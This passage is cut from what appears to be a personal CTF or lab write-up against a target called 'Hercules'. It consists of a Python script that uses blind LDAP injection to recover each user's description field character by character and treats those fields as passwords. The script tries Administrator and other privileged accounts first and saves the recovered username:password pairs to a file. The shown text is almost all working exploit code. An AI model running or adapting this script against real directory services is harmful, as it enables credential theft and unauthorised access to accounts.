       "%^&()=+[]{}|;:',<>?/`~\" \\"  # Less common
   )
   
   print(f"\n[*] Checking user: {username}")
   
   # First check if user has description
   if not test_ldap_injection(username):
       print(f"[-] User {username} has no description field")
       return None
   
   print(f"[+] User {username} has a description field, enumerating...")
   
   description = ""
   max_length = 50
   no_char_count = 0
   
   for position in range(max_length):
       found = False
       
       for char in charset:
           test_desc = description + char
           
           if test_ldap_injection(username, test_desc):
               description += char
               print(f"    Position {position}: '{char}' -> Current: {description}")
               found = True
               no_char_count = 0
               break
           
           # Small delay to avoid rate limiting
           time.sleep(0.01)
       
       if not found:
           no_char_count += 1
           if no_char_count >= 2:  # Stop after 2 positions with no chars
               break
   
   if description:
       print(f"[+] Complete: {username} => {description}")
       return description
   
   return None
def main():
   print("="*60)
   print("Hercules LDAP Description/Password Enumeration")
   print(f"Testing {len(KNOWN_USERS)} users")
   print("="*60)
   
   found_passwords = {}
   
   # Priority users to test first
   priority_users = ["web_admin", "auditor", "Administrator", "natalie.a", "ken.w"]
   other_users = [u for u in KNOWN_USERS if u not in priority_users]
   
   # Test priority users first
   for user in priority_users + other_users:
       password = enumerate_description(user)
       
       if password:
           found_passwords[user] = password
           
           # Save results immediately
           with open("hercules_passwords.txt", "a") as f:
               f.write(f"{user}:{password}\n")
           
           print(f"\n[+] FOUND: {user}:{password}\n")
   
   print("\n" + "="*60)
   print("ENUMERATION COMPLETE")
   print("="*60)
   
   if found_passwords:
       print(f"\nFound {len(found_passwords)} passwords:")
       for user, pwd in found_passwords.items():
           print(f"  {user}: {pwd}")
   else:
       print("\nNo passwords found")
if __name__ == "__main__":
   main()
```

1:00 PM - Almorzar :V